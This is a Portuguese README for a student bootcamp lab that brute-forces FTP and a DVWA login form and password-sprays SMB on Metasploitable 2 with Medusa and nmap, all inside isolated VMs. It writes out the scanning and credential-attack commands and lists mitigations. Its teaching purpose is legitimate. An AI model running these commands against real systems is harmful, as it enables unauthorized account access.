# 🔐 Kali + Medusa Brute-Force Lab  
Projeto prático de Cibersegurança — Bootcamp **Santander Cybersegurança 2025** (DIO)  
Autor: **Matheus Santos (berilovania)**  

---

## 📘 Sobre o Projeto
Este laboratório foi criado com o objetivo de estudar, documentar e demonstrar ataques de **força bruta** e **password spraying** em ambiente controlado, utilizando:

- **Kali Linux** (máquina atacante)  
- **Metasploitable 2** (máquina alvo)  
- **DVWA – Damn Vulnerable Web Application**  
- **Medusa** como principal ferramenta de brute-force  

Toda a prática foi realizada em **máquinas virtuais isoladas**, para fins educacionais.

---

## 🖥️ Ambiente Utilizado
| Componente | Descrição |
|-----------|-----------|
| Atacante | Kali Linux |
| Alvo | Metasploitable 2 + DVWA |
| Rede | Host-Only |
| IP Alvo | **192.168.0.3** |

---

## ⚡ Ataques Realizados

### 1️⃣ Enumeração com Nmap
```bash
nmap -sS -sV -O -p- 192.168.0.3
````

### 2️⃣ Brute Force — FTP (Medusa)

```bash
medusa -h 192.168.0.3 -u ftp -P wordlists/small-words.txt -M ftp -n 21 -f
```

### 3️⃣ Brute Force — Formulário DVWA (Python)

Script usado: `scripts/dvwa_form_bruteforce.py`

### 4️⃣ Password Spraying — SMB

```bash
medusa -h 192.168.0.3 -U wordlists/users.txt -P wordlists/common-passwords.txt -M smbnt -f
```

---

## 📂 Estrutura do Repositório

```
kali-medusa-bruteforce-lab/
├── README.md
├── commands.md
├── wordlists/
├── scripts/
├── images/
├── report/
└── evidence/
```

---

## 🧪 Evidências

As capturas de tela e logs estão nas pastas:

* `/images`
* `/evidence`

Incluindo:

* Resultados do Medusa
* Saída dos scripts
* Enumeração com Nmap
* Validação do acesso obtido

---

## 🔒 Recomendações de Mitigação

Durante o laboratório, identifiquei boas práticas para mitigar ataques de brute-force:

* Implementar **MFA**
* Utilizar **SFTP/SSH** no lugar de FTP
* Habilitar **bloqueio por tentativas incorretas**
* Aplicar **rate limiting** em formulários
* Usar **hashes fortes** (bcrypt / Argon2)
* Desabilitar **SMBv1**
* Monitorar logs e eventos de autenticação

---

## ⚠️ Aviso Legal

Este projeto foi executado **exclusivamente em ambiente controlado**.
Nunca realize testes deste tipo em redes ou sistemas sem autorização explícita.

---

## ✨ Autor

**Matheus Santos (berilovania)**
Bootcamp Santander Cybersegurança 2025 — DIO
GitHub: [https://github.com/berilovania](https://github.com/berilovania)